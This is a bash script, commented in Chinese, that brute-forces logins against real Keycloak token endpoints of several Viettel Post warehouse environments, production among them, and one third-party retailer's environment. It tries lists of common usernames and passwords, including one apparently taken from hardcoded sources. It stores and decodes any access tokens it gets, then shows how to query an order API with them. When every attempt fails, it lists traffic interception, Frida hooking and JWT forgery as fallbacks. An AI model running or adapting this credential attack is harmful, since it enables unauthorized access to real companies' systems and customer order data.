#!/bin/bash
# 批量测试所有环境 + 已知密码获取Token

echo "🔑 开始批量测试获取Token..."
echo "================================"

# 已知密码（从硬编码中提取）
PASSWORDS=("abc123" "YAaG8ji8TP3I3K6" "admin" "password" "123456" "Abc@123")

# 常见用户名
USERNAMES=("admin" "test" "warehouse" "vtp_admin" "wms_admin" "user" "demo")

# 所有Keycloak环境
ENVS=(
  "https://stg-keycloak.viettelpost.vn/realms/wms/protocol/openid-connect/token|STG环境"
  "https://dev-wms-auth.viettelpost.vn/realms/wms/protocol/openid-connect/token|DEV环境"
  "https://sit-wms-sso.viettelpost.vn/realms/wms/protocol/openid-connect/token|SIT环境"
  "https://mwms-sso.yody.io/realms/wms/protocol/openid-connect/token|YODY环境(第三方)"
  "https://dws-sso.viettelpost.vn/realms/wms/protocol/openid-connect/token|生产环境"
)

success_count=0

for env_data in "${ENVS[@]}"; do
  IFS='|' read -r env env_name <<< "$env_data"
  
  echo ""
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  echo "🌐 测试: $env_name"
  echo "   $env"
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  
  for user in "${USERNAMES[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
      echo -n "[*] 尝试 $user:$pass ... "
      
      response=$(curl -sk -X POST "$env" \
        --max-time 10 \
        -d "grant_type=password&username=$user&password=$pass&client_id=wms-client" \
        -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
      
      # 检查是否成功获取token
      if echo "$response" | grep -q "access_token"; then
        echo "✅ 成功！"
        echo ""
        echo "═══════════════════════════════════════════════════"
        echo "🎉 成功获取Token！"
        echo "═══════════════════════════════════════════════════"
        echo "环境:     $env_name"
        echo "URL:      $env"
        echo "用户名:   $user"
        echo "密码:     $pass"
        echo ""
        echo "$response" | jq . 2>/dev/null || echo "$response"
        echo ""
        
        # 提取token
        TOKEN=$(echo "$response" | jq -r '.access_token' 2>/dev/null)
        if [ "$TOKEN" != "null" ] && [ -n "$TOKEN" ]; then
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo "🔑 Bearer Token:"
          echo "$TOKEN"
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo ""
          
          # 保存token到文件
          echo "$TOKEN" > /workspace/token_success.txt
          echo "$env_name|$user|$pass|$TOKEN" >> /workspace/all_tokens.txt
          
          # 解析JWT
          echo "📊 JWT解析:"
          echo "$TOKEN" | awk -F'.' '{print $2}' | base64 -d 2>/dev/null | jq . || echo "无法解析"
          echo ""
          
          ((success_count++))
        fi
        
        echo "═══════════════════════════════════════════════════"
        echo ""
        
      elif echo "$response" | grep -iq "invalid.*credentials\|unauthorized\|invalid_grant"; then
        echo "❌ 凭证错误"
      elif echo "$response" | grep -iq "user.*not.*found\|unknown.*user"; then
        echo "⚠️  用户不存在"
      elif echo "$response" | grep -iq "timeout\|timed out"; then
        echo "⏱️  超时"
      elif [ -z "$response" ]; then
        echo "🔌 无响应"
      else
        echo "❓ 未知响应"
        # echo "   响应: $response" | head -c 100
      fi
    done
  done
done

echo ""
echo "================================"
echo "📊 测试完成汇总"
echo "================================"
echo "测试环境数: ${#ENVS[@]}"
echo "测试用户数: ${#USERNAMES[@]}"
echo "测试密码数: ${#PASSWORDS[@]}"
echo "总测试组合: $((${#ENVS[@]} * ${#USERNAMES[@]} * ${#PASSWORDS[@]}))"
echo "成功获取Token: $success_count"
echo ""

if [ $success_count -gt 0 ]; then
  echo "✅ Token已保存到:"
  echo "   /workspace/token_success.txt (最后一个成功的token)"
  echo "   /workspace/all_tokens.txt (所有成功的token)"
  echo ""
  echo "🚀 立即使用Token测试订单API:"
  echo "   export TOKEN=\$(cat /workspace/token_success.txt)"
  echo "   curl -sk \"https://gw.viettelpost.vn/api/v1/outbound-request/search?page=1&page_size=10\" \\"
  echo "     -H \"Authorization: Bearer \$TOKEN\" | jq ."
else
  echo "❌ 未成功获取任何Token"
  echo ""
  echo "📋 备选方案:"
  echo "   1. 注册真实账号（VTP Man App）"
  echo "   2. 使用mitmproxy抓包获取真实token"
  echo "   3. 使用Frida hook token生成函数"
  echo "   4. 尝试JWT伪造（需要签名密钥）"
fi

echo ""
